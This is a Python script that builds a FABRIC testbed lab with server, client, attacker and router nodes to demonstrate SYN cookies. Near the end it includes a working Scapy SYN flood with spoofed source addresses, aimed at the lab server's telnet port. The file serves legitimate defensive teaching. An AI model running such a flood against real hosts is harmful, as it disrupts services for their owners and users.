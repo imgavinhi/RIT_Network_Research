#Gavin Hunsinger

from ipaddress import ip_address, IPv4Address, IPv6Address, IPv4Network, IPv6Network
import ipaddress

from fabrictestbed_extensions.fablib.fablib import FablibManager as fablib_manager

fablib = fablib_manager()
                     
fablib.show_config();
slice_name = 'SYN_Flood_Cookies_Demo'

site1 = "MASS"
base_cores=2
base_ram=8
base_disk=10
desired_image='default_ubuntu_22'

node1_name = 'server'
node2_name = 'client'
node3_name = 'attacker'
router1_name = 'R1'

network1_name='server_side' 
network2_name='client_side'

nic_model = 'NIC_Basic'

node1_nic_name = 'NODE1NIC'
node2_nic_name = 'NODE2NIC'
node3_nic_name = 'NODE3NIC'

R1_nic1_name = 'nicR1a' #R1 interfaces
R1_nic2_name = 'nicR1b'
#Create Slice
slice = fablib.new_slice(name=slice_name)
#network definitions
#subnets and gateways used for routing configurations
net1_subnet = IPv4Network("10.10.10.0/24")
net1 = slice.add_l2network(name=network1_name, subnet=net1_subnet)

net2_subnet = IPv4Network("192.168.1.0/24")
net2 = slice.add_l2network(name=network2_name, subnet=net2_subnet)
R1 = slice.add_node(name=router1_name, site=site1, cores=base_cores, ram=base_ram, disk=base_disk, image=desired_image)
R1_iface1 = R1.add_component(model=nic_model, name=R1_nic1_name).get_interfaces()[0]
R1_iface2 = R1.add_component(model=nic_model, name=R1_nic2_name).get_interfaces()[0]

net1.add_interface(R1_iface1)
net2.add_interface(R1_iface2)
R1.add_route(subnet=net2_subnet, next_hop=net1.get_gateway())
R1.add_route(subnet=net1_subnet, next_hop=net2.get_gateway())
#server
N1 = slice.add_node(name=node1_name, site=site1, cores=base_cores, ram=base_ram, disk=base_disk, image=desired_image)
N1_Nic =  N1.add_component(model=nic_model, name=node1_nic_name).get_interfaces()[0]
net1.add_interface(N1_Nic)
#client
N2 = slice.add_node(name=node2_name, site=site1, cores=base_cores, ram=base_ram, disk=base_disk, image=desired_image)
N2_Nic = N2.add_component(model= nic_model, name=node2_nic_name).get_interfaces()[0]
net2.add_interface(N2_Nic)
#attacker
N3 = slice.add_node(name=node3_name, site=site1, cores=base_cores, ram=base_ram, disk=base_disk, image=desired_image)
N3_Nic = N3.add_component(model= nic_model, name=node3_nic_name).get_interfaces()[0]
net2.add_interface(N3_Nic)
N1.add_route(subnet=net2_subnet, next_hop=net1.get_gateway())

N2.add_route(subnet=net1_subnet, next_hop=net2.get_gateway())

N3.add_route(subnet=net1_subnet, next_hop=net2.get_gateway())
slice.submit();
#server on 10.10.10.0/24
N1 = slice.get_node(name=node1_name)
nic1 = N1.get_interface(network_name=network1_name)
nic1.ip_addr_add(IPv4Address('10.10.10.1'), net1_subnet)

#client and attacker on 192.168.1.0/24
#client
N2 = slice.get_node(name=node2_name)
nic2 = N2.get_interface(network_name=network2_name)
nic2.ip_addr_add(IPv4Address('192.168.1.1'), net2_subnet)

#attacker
N3 = slice.get_node(name=node3_name)
nic3 = N3.get_interface(network_name=network2_name)
nic3.ip_addr_add(IPv4Address('192.168.1.2'), net2_subnet)
#router
R1 = slice.get_node(name=router1_name)
R1nic1 = R1.get_interface(network_name =network1_name)
R1nic2 = R1.get_interface(network_name =network2_name)
R1nic1.ip_addr_add(IPv4Address('10.10.10.254'), net1_subnet)
R1nic2.ip_addr_add(IPv4Address('192.168.1.254'), net2_subnet)
#router's routing table
stdout, stderr = R1.execute(f'sudo ip link set enp7s0 up')
stdout, stderr = R1.execute(f'sudo ip link set enp8s0 up')
stdout, stderr = R1.execute(f'sudo sysctl net.ipv4.ip_forward=1')

stdout, stderr = R1.execute(f'sudo ufw status verbose')
#server routing table
stdout, stderr = N1.execute(f'sudo ip link set enp7s0 up')
stdout, stderr = N1.execute(f'sudo ip route add 192.168.1.0/24 via 10.10.10.254')
stdout, stderr = N1.execute(f'sudo ufw status verbose')
#client routing table
stdout, stderr = N2.execute(f'sudo ip link set enp7s0 up')
stdout, stderr = N2.execute(f'sudo ip route add 10.10.10.0/24 via 192.168.1.254')
stdout, stderr = N2.execute(f'sudo ufw status verbose')
#attacker routing table
stdout, stderr = N3.execute(f'sudo ip link set enp7s0 up')
stdout, stderr = N3.execute(f'sudo ip route add 10.10.10.0/24 via 192.168.1.254')
stdout, stderr = N3.execute(f'sudo ufw status verbose')
stdout, stderr = N1.execute(f'sudo apt-get -y update')
stdout, stderr = N2.execute(f'sudo apt-get -y update')
stdout, stderr = N3.execute(f'sudo apt-get -y update')
stdout, stderr = N3.execute(f'sudo apt-get install -y python3-pip')
stdout, stderr = N3.execute(f'sudo pip3 install scapy')
#telnet server install
stdout, stderr = N1.execute(f'sudo apt install telnetd -y')
stdout, stderr = N1.execute(f'sudo apt install tshark -y')
'''
COMMANDS
change password on server: sudo passwd ubuntu

see syn cookies: cat /proc/sys/net/ipv4/tcp_syncookies
change syn cookies: sudo vim /etc/sysctl.conf
apply changes: sudo sysctl -p
see syn queue: ss -n state syn-recv sport = :23 | wc -l

client telnet command: telnet 10.10.10.1 23

max backlog: sysctl net.ipv4.tcp_max_syn_backlog

packet viewing: sudo tshark -i enp7s0 -f "port 23"
'''
'''
from scapy.all import *

# Define the target IP address
target_ip = "10.10.10.1"

# Define the target port (usually port 80 for HTTP)
target_port = 23

# Define the number of SYN packets to send
num_syn_packets = 3000

# Create a loop to send SYN packets
for _ in range(num_syn_packets):
    # Generate a random source IP address
    source_ip = RandIP()

    # Craft a SYN packet with Scapy
    ip_packet = IP(src=source_ip, dst=target_ip)
    tcp_packet = TCP(sport=RandShort(), dport=target_port, flags="S")

    # Send the SYN packet
    send(ip_packet/tcp_packet, verbose=0)
''
